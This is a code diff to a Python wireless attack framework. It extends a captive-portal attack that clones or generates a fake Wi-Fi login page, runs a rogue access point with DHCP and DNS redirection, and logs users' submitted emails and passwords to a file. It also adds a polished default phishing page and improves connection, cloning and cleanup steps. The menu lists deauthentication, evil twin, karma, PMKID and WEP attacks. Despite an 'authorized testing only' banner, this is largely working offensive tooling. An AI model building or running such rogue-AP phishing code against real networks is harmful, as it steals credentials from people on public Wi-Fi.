@@ -277,14 +277,36 @@ class WirelessAttackFramework:
         if not csv_file:
             print("\nNo airodump CSV files found in current directory.")
             print("Run airodump-ng first to scan for networks.")
-            return False
+            print("\nStarting Attack Framework in Captive Portal Mode")
+            print("(You can still use the default captive portal attack)")
+
+            # Set a placeholder target so the framework can continue
+            self.target_network = {
+                'essid': '[No Target Selected]',
+                'bssid': '00:00:00:00:00:00',
+                'channel': '6',
+                'privacy': 'OPN',
+                'power': '0'
+            }
+            self.discovered_networks = []
+            self.clients_by_bssid = {}
+            return True  # Return True to continue to main menu
 
         print(f"\nReading networks from: {csv_file}")
         self.discovered_networks = self.parse_airodump_csv(csv_file)
 
         if not self.discovered_networks:
             print("No networks found in CSV file.")
-            return False
+            print("\nStarting Attack Framework in Captive Portal Mode")
+
+            self.target_network = {
+                'essid': '[No Target Selected]',
+                'bssid': '00:00:00:00:00:00',
+                'channel': '6',
+                'privacy': 'OPN',
+                'power': '0'
+            }
+            return True
 
         print("\n" + "="*70)
         print("DISCOVERED NETWORKS")
@@ -986,21 +1008,61 @@ class WirelessAttackFramework:
         else:
             print("Invalid selection.")
 
+    def find_strongest_ap_for_ssid(self, target_ssid):
+        """Find the AP with strongest signal for a given SSID"""
+        # Filter networks matching the target SSID
+        matching_aps = [net for net in self.discovered_networks
+                        if net['essid'] == target_ssid]
+
+        if not matching_aps:
+            return None
+
+        # Convert power to int for comparison (remove any non-numeric chars)
+        for ap in matching_aps:
+            try:
+                # Power is like "-46", convert to int
+                ap['power_int'] = int(ap['power'].strip())
+            except:
+                ap['power_int'] = -100  # Default to very weak if can't parse
+
+        # Sort by power (higher/closer to 0 is stronger)
+        # -46 > -74, so we want max()
+        strongest = max(matching_aps, key=lambda x: x['power_int'])
+
+        print(f"\nFound {len(matching_aps)} APs with SSID '{target_ssid}'")
+        print(f"Selecting strongest: {strongest['bssid']} (Power: {strongest['power']} dBm)")
+
+        return strongest
+
     def clone_captive_portal(self):
         """Clone target network's captive portal"""
         if not self.target_network:
             print("No target selected.")
             return
 
+        # Find strongest AP for this SSID
+        target_ssid = self.target_network['essid']
+        strongest_ap = self.find_strongest_ap_for_ssid(target_ssid)
+
+        if strongest_ap:
+            # Use strongest AP instead of originally selected target
+            connection_target = strongest_ap
+            print(f"\nUsing strongest AP for connection:")
+            print(f"  BSSID: {strongest_ap['bssid']}")
+            print(f"  Channel: {strongest_ap['channel']}")
+            print(f"  Power: {strongest_ap['power']} dBm")
+        else:
+            # Fallback to original target
+            connection_target = self.target_network
+
         # Verify target is open network
-        if self.target_network['privacy'].upper() not in ['OPN', 'OPEN', '']:
-            print(f"\nWarning: Target network appears to be {self.target_network['privacy']}")
+        if connection_target['privacy'].upper() not in ['OPN', 'OPEN', '']:
+            print(f"\nWarning: Target network appears to be {connection_target['privacy']}")
             print("This attack works best on open (OPN) networks with captive portals.")
             proceed = input("Continue anyway? (y/n): ").strip().lower()
             if proceed != 'y':
                 return
 
-        target_ssid = self.target_network['essid']
         portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}")
         portal_dir.mkdir(parents=True, exist_ok=True)
 
@@ -1008,12 +1070,13 @@ class WirelessAttackFramework:
         print(f"CLONING CAPTIVE PORTAL: {target_ssid}")
         print(f"{'='*60}")
 
-        # Step 1: Connect to target network
+        # Step 1: Connect to target network using strongest AP
         print(f"\n[1/6] Connecting to target network...")
         if not self.connect_to_network(target_ssid):
             print("Failed to connect to target network.")
             return
 
+        # Rest of the method stays the same...
         # Step 2: Detect captive portal URL
         print(f"\n[2/6] Detecting captive portal URL...")
         portal_url = self.detect_captive_portal()
@@ -1025,7 +1088,7 @@ class WirelessAttackFramework:
 
         # Step 3: Clone portal with httrack
         print(f"\n[3/6] Cloning portal with httrack...")
-        if not self.clone_portal_httrack(portal_url, portal_dir):
+        if not self.clone_portal_wget(portal_url, portal_dir):
             print("Failed to clone portal.")
             self.disconnect_from_network()
             return
@@ -1052,60 +1115,53 @@ class WirelessAttackFramework:
 
         self.launch_rogue_ap_with_portal(portal_dir)
 
-    def connect_to_network(self, ssid):
-        """Connect attacking interface to target network"""
+    def connect_to_network(self, ssid, bssid=None):
+        """Connect attacking interface to target network using NetworkManager"""
         try:
-            # Kill any processes using the interface
-            subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
-                        capture_output=True, timeout=5)
-
-            # Ensure interface is in managed mode
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
-                        capture_output=True)
-
-            # Bring interface up
-            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
-                        check=True, capture_output=True)
-
-            # Connect to network
             print(f"Connecting to {ssid}...")
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'essid', ssid],
-                        check=True, capture_output=True)
 
-            # Request DHCP address
-            print("Requesting IP address...")
-            result = subprocess.run(['sudo', 'dhclient', '-v', self.selected_interface],
-                                capture_output=True, text=True, timeout=15)
+            # Simple nmcli connection - that's it!
+            result = subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
+                                'ifname', self.selected_interface],
+                                capture_output=True, text=True, timeout=30)
 
-            # Verify connection
-            time.sleep(3)
+            if result.returncode != 0:
+                print(f"Connection failed: {result.stderr}")
+                return False
+
+            print(f"Connected to {ssid}")
+            time.sleep(2)
+
+            # Verify we got an IP
             check = subprocess.run(['ip', 'addr', 'show', self.selected_interface],
                                 capture_output=True, text=True)
 
             if 'inet ' in check.stdout:
-                print(f"Connected successfully to {ssid}")
+                ip_match = re.search(r'inet ([\d.]+)', check.stdout)
+                if ip_match:
+                    print(f"IP Address: {ip_match.group(1)}")
                 return True
-            else:
-                print("Connection failed - no IP address assigned")
-                return False
+
+            return False
 
         except subprocess.TimeoutExpired:
             print("Connection timeout")
             return False
-        except subprocess.CalledProcessError as e:
+        except Exception as e:
             print(f"Connection error: {e}")
             return False
 
     def disconnect_from_network(self):
-        """Disconnect from current network"""
+        """Disconnect from current network using NetworkManager"""
         try:
-            subprocess.run(['sudo', 'dhclient', '-r', self.selected_interface],
-                        capture_output=True, timeout=5)
-            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'essid', '""'],
-                        capture_output=True)
-            print("Disconnected from network")
+            print("Disconnecting from network...")
+            subprocess.run(['sudo', 'nmcli', 'device', 'disconnect', self.selected_interface],
+                        capture_output=True, timeout=10)
+            time.sleep(1)
+            print("Disconnected")
             return True
-        except:
+        except Exception as e:
+            print(f"Disconnect error: {e}")
             return False
 
     def detect_captive_portal(self):
@@ -1143,51 +1199,38 @@ class WirelessAttackFramework:
             pass
 
         return None
-
-    def clone_portal_httrack(self, url, output_dir):
-        """Clone captive portal using httrack"""
+    def clone_portal_wget(self, url, output_dir):
+        """Clone captive portal using wget"""
         try:
-            # Check if httrack is available
-            httrack_path = self.find_tool('httrack')
-            if not httrack_path:
-                print("httrack not found. Please install it:")
-                print("  sudo apt-get install httrack")
-                return False
-
             clone_path = output_dir / 'cloned'
             clone_path.mkdir(exist_ok=True)
 
-            # HTTrack command for deep mirror
+            print(f"Cloning portal: {url}")
+
             cmd = [
-                'sudo', httrack_path,
-                url,
-                '-O', str(clone_path),
-                '-r6',  # Depth 6 for comprehensive clone
-                '-%v',  # Verbose
-                '-s0',  # No speed limit
-                '--disable-security-limits',
-                '-c10',  # 10 connections
-                '*.css', '*.js', '*.png', '*.jpg', '*.jpeg', '*.gif', '*.ico', '*.html', '*.htm'
+                'wget',
+                '--recursive',
+                '--level=3',
+                '--page-requisites',
+                '--adjust-extension',
+                '--convert-links',
+                '--no-parent',
+                '--no-host-directories',
+                '--directory-prefix', str(clone_path),
+                '--timeout=20',
+                '--tries=2',
+                url
             ]
 
-            print(f"Running: httrack {url}")
-            print("This may take a minute...")
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
 
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-
-            # Check if files were created
-            html_files = list(clone_path.glob('**/*.html')) + list(clone_path.glob('**/*.htm'))
-
+            html_files = list(clone_path.glob('**/*.html'))
             if html_files:
-                print(f"Successfully cloned {len(html_files)} HTML files")
+                print(f"Cloned {len(html_files)} pages with assets")
                 return True
-            else:
-                print("No HTML files found in clone")
-                return False
 
-        except subprocess.TimeoutExpired:
-            print("HTTrack timeout - portal may be too large")
             return False
+
         except Exception as e:
             print(f"Clone error: {e}")
             return False
@@ -1198,7 +1241,18 @@ class WirelessAttackFramework:
         from bs4 import BeautifulSoup
 
         clone_path = portal_dir / 'cloned'
-        html_files = list(clone_path.glob('**/*.html')) + list(clone_path.glob('**/*.htm'))
+
+        # Get all HTML files, but filter out directories and special HTTrack files
+        html_files = []
+        for pattern in ['**/*.html', '**/*.htm']:
+            for file_path in clone_path.glob(pattern):
+                # Skip if it's a directory or special HTTrack index files
+                if file_path.is_file() and file_path.name not in ['*.html', '*.htm', 'index.html~']:
+                    html_files.append(file_path)
+
+        if not html_files:
+            print("No valid HTML files found to modify")
+            return
 
         modified_count = 0
 
@@ -1243,7 +1297,22 @@ class WirelessAttackFramework:
             print("No target network selected")
             return
 
-        clone_path = portal_dir / 'cloned'
+        # Check if port 80 is in use
+        port_check = subprocess.run(['sudo', 'lsof', '-i', ':80'],
+                                    capture_output=True, text=True)
+        if port_check.stdout:
+            print("\nPort 80 is already in use:")
+            print(port_check.stdout)
+            print("\nAttempting to free port 80...")
+
+            # Common services that use port 80
+            for service in ['apache2', 'nginx', 'lighttpd', 'httpd']:
+                subprocess.run(['sudo', 'systemctl', 'stop', service],
+                            capture_output=True)
+
+            time.sleep(2)
+
+        clone_path = portal_dir / portal_subdir
 
         # Find the main index file
         index_file = None
@@ -1255,7 +1324,7 @@ class WirelessAttackFramework:
 
         if not index_file:
             # Just use first HTML file found
-            html_files = list(clone_path.glob('**/*.html'))
+            html_files = [f for f in clone_path.glob('**/*.html') if f.is_file()]
             if html_files:
                 index_file = html_files[0]
             else:
@@ -1334,6 +1403,7 @@ class WirelessAttackFramework:
 
         # Start services
         processes = []
+        httpd = None
 
         try:
             # 1. Create dnsmasq config
@@ -1387,20 +1457,20 @@ class WirelessAttackFramework:
             print("Starting captive portal web server...")
             PORT = 80
 
-            with socketserver.TCPServer(("192.168.1.1", PORT), CaptivePortalHandler) as httpd:
-                httpd.target_ssid = self.target_network['essid']
-                httpd.creds_file = creds_file
+            httpd = socketserver.TCPServer(("192.168.1.1", PORT), CaptivePortalHandler)
+            httpd.target_ssid = self.target_network['essid']
+            httpd.creds_file = creds_file
 
-                print(f"\n{'='*70}")
-                print("ROGUE AP ACTIVE")
-                print(f"{'='*70}")
-                print(f"SSID: {self.target_network['essid']}")
-                print(f"Portal: http://192.168.1.1")
-                print(f"Credentials logged to: {creds_file}")
-                print(f"\nWaiting for clients to connect...")
-                print("Press Ctrl+C to stop\n")
+            print(f"\n{'='*70}")
+            print("ROGUE AP ACTIVE")
+            print(f"{'='*70}")
+            print(f"SSID: {self.target_network['essid']}")
+            print(f"Portal: http://192.168.1.1")
+            print(f"Credentials logged to: {creds_file}")
+            print(f"\nWaiting for clients to connect...")
+            print("Press Ctrl+C to stop\n")
 
-                httpd.serve_forever()
+            httpd.serve_forever()
 
         except KeyboardInterrupt:
             print("\n\nStopping services...")
@@ -1409,6 +1479,15 @@ class WirelessAttackFramework:
         finally:
             # Cleanup
             print("Cleaning up...")
+
+            # Stop web server
+            if httpd:
+                try:
+                    httpd.shutdown()
+                    httpd.server_close()
+                    print("Stopped web server")
+                except:
+                    pass
 
             # Stop processes
             for name, proc in processes:
@@ -1419,26 +1498,342 @@ class WirelessAttackFramework:
                 except:
                     try:
                         proc.kill()
+                        proc.wait(timeout=2)
                     except:
                         pass
 
-            # Clean up iptables
+            # Clean up iptables rules
+            print("Removing firewall rules...")
+            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-D', 'POSTROUTING', '-o', 'eth0', '-j', 'MASQUERADE'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'iptables', '-D', 'FORWARD', '-i', 'at0', '-j', 'ACCEPT'],
+                        capture_output=True)
             subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
             subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
 
-            # Remove at0
+            # Remove at0 interface
+            print("Removing at0 interface...")
+            subprocess.run(['sudo', 'ip', 'addr', 'flush', 'dev', 'at0'], capture_output=True)
             subprocess.run(['sudo', 'ip', 'link', 'set', 'at0', 'down'], capture_output=True)
+            subprocess.run(['sudo', 'ip', 'link', 'delete', 'at0'], capture_output=True)
 
-            print("Cleanup complete")
+            # Reset attack interface from PROMISC mode
+            print(f"Resetting {self.selected_interface}...")
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
+                        capture_output=True)
+
+            # Remove dnsmasq config file
+            try:
+                dnsmasq_conf = portal_dir / 'dnsmasq.conf'
+                if dnsmasq_conf.exists():
+                    dnsmasq_conf.unlink()
+            except:
+                pass
+
+            print("Rogue AP cleanup complete")
 
     def default_captive_portal(self):
-        """Use default captive portal (placeholder for future implementation)"""
-        print("\n" + "="*50)
+        """Use default captive portal"""
+        print("\n" + "="*60)
         print("DEFAULT CAPTIVE PORTAL")
-        print("="*50)
-        print("This will use a pre-built captive portal template.")
-        print("Feature coming soon...")
-        input("\nPress Enter to continue...")
+        print("="*60)
+
+        # Prompt for SSID name
+        if self.target_network and self.target_network['essid'] != '[Hidden]':
+            default_ssid = self.target_network['essid']
+            prompt = f"Enter SSID for rogue AP (default: {default_ssid}): "
+        else:
+            default_ssid = "Free_WiFi"
+            prompt = "Enter SSID for rogue AP (default: Free_WiFi): "
+
+        target_ssid = input(prompt).strip() or default_ssid
+
+        portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}_default")
+        portal_dir.mkdir(parents=True, exist_ok=True)
+
+        print(f"\nCreating portal for SSID: {target_ssid}")
+
+        # Create the default portal
+        portal_html_dir = self.create_default_portal(portal_dir, target_ssid)
+
+        print("\nStarting infrastructure:")
+        print("  - Rogue AP (airbase-ng)")
+        print("  - DHCP server (dnsmasq)")
+        print("  - DNS redirect")
+        print("  - Web server (Python)")
+        print("\nPress Ctrl+C to stop all services\n")
+
+        input("Press Enter to start, or Ctrl+C to cancel...")
+
+        # Update target_network with the chosen SSID for the rogue AP
+        if not self.target_network:
+            self.target_network = {
+                'essid': target_ssid,
+                'channel': '6',
+                'bssid': '00:00:00:00:00:00'
+            }
+        else:
+            self.target_network['essid'] = target_ssid
+
+        # Use the same launch method, just with different portal directory
+        self.launch_rogue_ap_with_portal(portal_dir, portal_subdir='default_portal')
+
+    def create_default_portal(self, portal_dir, ssid):
+        """Create a professional default captive portal"""
+
+        # Create portal directory structure
+        portal_html_dir = portal_dir / 'default_portal'
+        portal_html_dir.mkdir(parents=True, exist_ok=True)
+
+        # Create a professional-looking captive portal HTML
+        html_content = f'''<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>WiFi Login - {ssid}</title>
+        <style>
+            * {{
+                margin: 0;
+                padding: 0;
+                box-sizing: border-box;
+            }}
+
+            body {{
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                min-height: 100vh;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                padding: 20px;
+            }}
+
+            .container {{
+                background: white;
+                border-radius: 12px;
+                box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+                max-width: 400px;
+                width: 100%;
+                padding: 40px;
+            }}
+
+            .logo {{
+                text-align: center;
+                margin-bottom: 30px;
+            }}
+
+            .wifi-icon {{
+                width: 80px;
+                height: 80px;
+                margin: 0 auto 20px;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                border-radius: 50%;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                font-size: 40px;
+                color: white;
+            }}
+
+            h1 {{
+                color: #333;
+                font-size: 24px;
+                text-align: center;
+                margin-bottom: 10px;
+            }}
+
+            .network-name {{
+                text-align: center;
+                color: #667eea;
+                font-weight: 600;
+                font-size: 18px;
+                margin-bottom: 30px;
+            }}
+
+            .welcome-text {{
+                text-align: center;
+                color: #666;
+                margin-bottom: 30px;
+                line-height: 1.5;
+            }}
+
+            .form-group {{
+                margin-bottom: 20px;
+            }}
+
+            label {{
+                display: block;
+                color: #333;
+                font-weight: 500;
+                margin-bottom: 8px;
+                font-size: 14px;
+            }}
+
+            input {{
+                width: 100%;
+                padding: 12px 15px;
+                border: 2px solid #e0e0e0;
+                border-radius: 6px;
+                font-size: 15px;
+                transition: border-color 0.3s;
+            }}
+
+            input:focus {{
+                outline: none;
+                border-color: #667eea;
+            }}
+
+            button {{
+                width: 100%;
+                padding: 14px;
+                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+                color: white;
+                border: none;
+                border-radius: 6px;
+                font-size: 16px;
+                font-weight: 600;
+                cursor: pointer;
+                transition: transform 0.2s, box-shadow 0.2s;
+            }}
+
+            button:hover {{
+                transform: translateY(-2px);
+                box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+            }}
+
+            button:active {{
+                transform: translateY(0);
+            }}
+
+            .terms {{
+                text-align: center;
+                margin-top: 20px;
+                font-size: 12px;
+                color: #999;
+            }}
+
+            .terms a {{
+                color: #667eea;
+                text-decoration: none;
+            }}
+
+            .footer {{
+                text-align: center;
+                margin-top: 30px;
+                padding-top: 20px;
+                border-top: 1px solid #e0e0e0;
+                color: #999;
+                font-size: 12px;
+            }}
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <div class="logo">
+                <div class="wifi-icon">📶</div>
+                <h1>WiFi Access</h1>
+                <div class="network-name">{ssid}</div>
+            </div>
+
+            <div class="welcome-text">
+                Welcome! Please sign in to access the internet.
+            </div>
+
+            <form action="/capture_credentials" method="post">
+                <div class="form-group">
+                    <label for="username">Email or Username</label>
+                    <input type="text" id="username" name="username" required placeholder="Enter your email">
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" required placeholder="Enter your password">
+                </div>
+
+                <button type="submit">Connect to WiFi</button>
+            </form>
+
+            <div class="terms">
+                By connecting, you agree to our <a href="#">Terms of Service</a>
+            </div>
+
+            <div class="footer">
+                Secure WiFi Connection
+            </div>
+        </div>
+    </body>
+    </html>'''
+
+        # Write the HTML file
+        index_file = portal_html_dir / 'index.html'
+        with open(index_file, 'w', encoding='utf-8') as f:
+            f.write(html_content)
+
+        print(f"Default portal created at: {portal_html_dir}")
+        return portal_html_dir
+
+    def cleanup_and_restore_interfaces(self):
+        """Restore interfaces and network services on exit"""
+        print("\n" + "="*60)
+        print("RESTORING NETWORK INTERFACES")
+        print("="*60)
+
+        try:
+            if not self.selected_interface:
+                print("No interface was selected - restarting NetworkManager only.")
+                subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'],
+                            capture_output=True)
+                subprocess.run(['sudo', 'service', 'network-manager', 'start'],
+                            capture_output=True)
+                return
+
+            print(f"Resetting {self.selected_interface}...")
+
+            # Turn off promiscuous mode
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'promisc', 'off'],
+                        capture_output=True)
+
+            # Reset interface
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'down'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'iwconfig', self.selected_interface, 'mode', 'managed'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'ip', 'link', 'set', self.selected_interface, 'up'],
+                        capture_output=True)
+
+            time.sleep(2)
+
+            # Restart NetworkManager
+            print("Restarting NetworkManager...")
+            subprocess.run(['sudo', 'systemctl', 'start', 'NetworkManager'],
+                        capture_output=True)
+            subprocess.run(['sudo', 'service', 'network-manager', 'start'],
+                        capture_output=True)
+
+            time.sleep(2)
+            print("Interface restoration complete")
+
+        except Exception as e:
+            print(f"Cleanup error: {e}")
+
+    def get_all_wireless_interfaces(self):
+        """Get all wireless interfaces (not just available ones)"""
+        interfaces = []
+        net_path = Path('/sys/class/net')
+
+        if net_path.exists():
+            for iface_dir in net_path.iterdir():
+                if (iface_dir / 'wireless').exists():
+                    interfaces.append(iface_dir.name)
+
+        return sorted(set(interfaces))
 
     def run(self):
         """Main program loop"""
@@ -1446,49 +1841,54 @@ class WirelessAttackFramework:
         print("FOR AUTHORIZED SECURITY TESTING ONLY")
         print("="*60)
 
-        # Select interface
-        if not self.select_interface():
-            return
+        try:
+            # Select interface
+            if not self.select_interface():
+                return
 
-        # Select target
-        if not self.select_target_network():
-            return
+            # Select target
+            if not self.select_target_network():
+                return
 
-        # Main menu loop
-        while True:
-            try:
-                self.display_attack_menu()
-                choice = input("\nSelect attack (1-10): ").strip()
+            # Main menu loop
+            while True:
+                try:
+                    self.display_attack_menu()
+                    choice = input("\nSelect attack (1-11): ").strip()
 
-                if choice == '1':
-                    self.deauth_attack()
-                elif choice == '2':
-                    self.dos_attacks_menu()
-                elif choice == '3':
-                    self.evil_twin_attack()
-                elif choice == '4':
-                    self.karma_attack()
-                elif choice == '5':
-                    self.captive_portal_attack()
-                elif choice == '6':
-                    self.pmkid_capture()
-                elif choice == '7':
-                    self.wpa_handshake_capture()
-                elif choice == '8':
-                    self.wep_attacks_menu()
-                elif choice == '9':
-                    self.select_target_network()
-                elif choice == '10':
-                    self.select_interface()
-                elif choice == '11':
-                    print("\nExiting...")
+                    if choice == '1':
+                        self.deauth_attack()
+                    elif choice == '2':
+                        self.dos_attacks_menu()
+                    elif choice == '3':
+                        self.evil_twin_attack()
+                    elif choice == '4':
+                        self.karma_attack()
+                    elif choice == '5':
+                        self.captive_portal_attack()
+                    elif choice == '6':
+                        self.pmkid_capture()
+                    elif choice == '7':
+                        self.wpa_handshake_capture()
+                    elif choice == '8':
+                        self.wep_attacks_menu()
+                    elif choice == '9':
+                        self.select_target_network()
+                    elif choice == '10':
+                        self.select_interface()
+                    elif choice == '11':
+                        print("\nExiting...")
+                        break
+                    else:
+                        print("Invalid selection.")
+
+                except KeyboardInterrupt:
+                    print("\n\nExiting...")
                     break
-                else:
-                    print("Invalid selection.")
 
-            except KeyboardInterrupt:
-                print("\n\nExiting...")
-                break
+        finally:
+            # Always cleanup on exit
+            self.cleanup_and_restore_interfaces()
 
 def main():
     if os.geteuid() != 0:
